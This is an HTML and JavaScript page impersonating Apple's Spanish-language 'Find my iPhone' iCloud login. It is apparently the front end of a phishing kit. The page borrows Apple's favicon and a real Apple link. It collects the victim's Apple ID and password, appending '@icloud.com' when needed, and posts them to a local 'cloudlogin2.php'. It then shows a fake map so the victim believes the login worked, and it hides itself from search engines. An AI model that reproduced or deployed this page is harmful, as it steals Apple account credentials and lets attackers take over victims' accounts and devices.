<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta content="width=device-width, initial-scale=1" name="viewport"/>
	<meta name="robots" content="noindex, nofollow" />
	<title>iCloud</title>
	<link rel="stylesheet" href="assets/layout/strap.css">
    <link rel="shortcut icon" type="image/x-icon" href="https://appleid.cdn-apple.com/static/bin/cb3606853004/images/favicon.ico">
	<link rel="stylesheet" href="assets/layout/apple.css">
	<link rel="stylesheet" href="assets/layout/kit.css">
	<link rel="stylesheet" href="assets/layout/animate.css">	
    <style type="text/css">
<!--
.Estilo2 {
	font-family: 'Lato', Tahoma;
	font-size: 22px;
}
-->
.login-form{
	width: 100%;
}
.login-form .keepme{
	color:#000;
	font-family: 'Lato Light', Tahoma !important;
	margin-top: 80px;
}
.overcodes{
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
}
.codes{
	max-width: 460px;
	margin:auto;
	text-align: center;
	padding:25px 0;
}
.codes h5{
	color: #fff;
	font-weight: bold;
	font-size:22px;
	margin-bottom: 18px;
}
.codes .circles, .codes .circles2{
	padding-left: 0;
}
.codes .circles li, .codes .circles2 li{
	list-style: none;
	display: inline-block;
	vertical-align: top;
}
.codes .circles span{
	width: 14px;
	height: 14px;
	border:1px solid #fff;
	border-radius: 50%;
	display: block;
	margin:0 10px;
}
.codes .circles2 span{
	display: block;
	width: 70px;
	height: 70px;
	border-radius: 50%;
	background: rgba(255,255,255,.1);
	color: #fff;
	font-size:10px;
	font-weight: bold;
	line-height: 24px;
	letter-spacing: 2px;
	margin:11px 16px;
	padding-top: 15px;
	cursor: pointer;
	padding-left: 4px;
}
.codes .circles2 span strong{
	font-size: 27px;
	display: block;
}
.cancelcode{
	color: #fff;
	font-size: 17px;
	float: right;
	margin-top: 30px;
	font-weight: bold;
	margin-right: 15%;
}
.move{
	margin: auto;
	max-width: 338px;
	position: relative;
	padding: 0 5px;
}
#demo{
	position: fixed;
	height: 100%;
	width: 100%;
}
body{
	background-image: none;
	background: #fff;
}
#apple_id{
	border: 1px solid #b1aaaa;
}
.login-form .forget{
	margin-top: 0;
}
.login-form .forget a{
	color:#0070c9;
	font-family: 'Lato Light', Tahoma !important;
	font-size: 15px;
}
.preloader{
	background:#fff;
}

    </style>

</head>
<body class="section-demo">
	<section id="mapmov" style="display: none;">
		<img src="mapmov.png" width="100%">
	</section>
<section class="login-form text-center">

	<p>&nbsp;</p>
	<p>&nbsp;</p>
	<p>&nbsp;</p>
	<div class="move">
		<p><img src="logov2.png" alt="" width="100" class="img-cloud">    </p>
		<h3 class="Estilo2">Buscar mi iPhone de iCloud</h3>
		<form action="" class="cloud-login" method="post">
			<input class="id" name="xuser" id="apple_id" placeholder="Apple ID" style="direction: ltr ! important;border-radius:6px;" type="text">
			<input autocomplete="off" class="pwd" name="xpass" id="apple_pwd" placeholder="Contraseña" style="direction: ltr ! important;display:none;" type="password">
			<input type="hidden" name="id" value="">
			<input class="dolog2" name="c_log2" id="c_log2" value="" type="submit" style="top:10px;">
			<img class="loading" id="load2" src="assets/img/ajax-loader.gif" alt="Loading" style="top:10px;">
			<input class="dolog" name="c_log" id="c_log" value="" type="submit" style="display:none;">
			<img class="loading" id="load" src="assets/img/ajax-loader.gif" alt="Loading" style="display:none;">
			<div class="alrt">
				<h3><CENTER>La contraseña o el ID de Apple son incorrectos.<br>
				¿Has olvidado la contraseña?</CENTER></h3>
			</div>
		</form>
	</div>
	<div class="keepme">
		<input type="checkbox" id="keepme" />
		<span for="keepme">Permanecer conectado</span>
	</div>
	<div style="margin-top: 14px;height: 1px;">
		<img src="sep.png">
	</div>
	<div class="forget">
		<a href="https://iforgot.apple.com/" target="_blank">¿Olvidaste tu ID de Apple o la contraseña?</a>
	</div>
</section>
<div class="preloader">
	<img src="assets/img/ajax-loader.gif" alt="">
</div>
	<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
	<script>
	$(document).on("ready", funciones);
	function funciones(){
		$(".preloader").delay(1500).fadeOut(1500);
		$("#c_log2").on("click", getPass);
		function getPass(){
			$("img.loading#load2").show(0);
			$("#apple_pwd").delay(1500).slideDown(10);
			setTimeout(function(){
			$("#apple_id").css("border-radius", "6px 6px 0 0");
			$("#apple_id").css("border-bottom", "0");
			}, 1300);
			$("img.loading#load2").delay(800).fadeOut();
			$("#c_log").delay(1500).fadeIn();
			$("#c_log2, #load2").fadeOut();
			return false;
		}
		$("#apple_pwd").keypress(function(e) {
		    $("#c_log2, #load2").remove();
		});
		$("#c_log").on("click", getCloud);
		function getCloud(a){
			var datos = $(".cloud-login").serialize();
			$("img.loading#load").show(0);
			$("#c_log").css("opacity",0);
			$.post(
				"cloudlogin2.php",
				datos,
				function(b){
					if(b==1){
						$(".login-form").fadeOut();
						$(".preloader").fadeIn().delay(1000).fadeOut();
						$("#mapmov").fadeIn();
						$("body").css("background", "#e8e8e8");
					}else{
						$("#apple_pwd").val("");
						$("#c_log").css("background-position", "0 0");
						$(".move").animate({'left':'20px'},60).animate({'left':'0'},60).animate({'left':'20px'},60).animate({'left':'0'},60).animate({'left':'20px'},60).animate({'left':'0'},60);
						$(".login-form form.cloud-login .alrt").slideDown();
						$("img.loading#load").fadeOut();
						$("#c_log").css("opacity",1);
					}
				}
			);
			a.preventDefault();
		}
		$("#apple_pwd").on("click", getDom);
		function getDom(){
			var id = $("#apple_id").val();
			if(id!=""){
				if(id.indexOf('@') != -1){

				}else{
					id = id+"@icloud.com";
					$("#apple_id").val(id);
				}
			}
		}
		$("#apple_pwd").on("keyup", validaCloud);
		function validaCloud(){
			var user = $("#apple_id").val();
			var pass = $(this).val();
			if(user!="" && pass !=""){
				$("#c_log").css("background-position", "-28px 0");
			}else{
				$("#c_log").css("background-position", "0 0");
			}
			$(".login-form form.cloud-login .alrt").hide(0);
		}
					$(".foot, .login-form, #header").fadeIn(0);
			$(".overcodes").hide(0);
			}
	</script>
</body>
</html>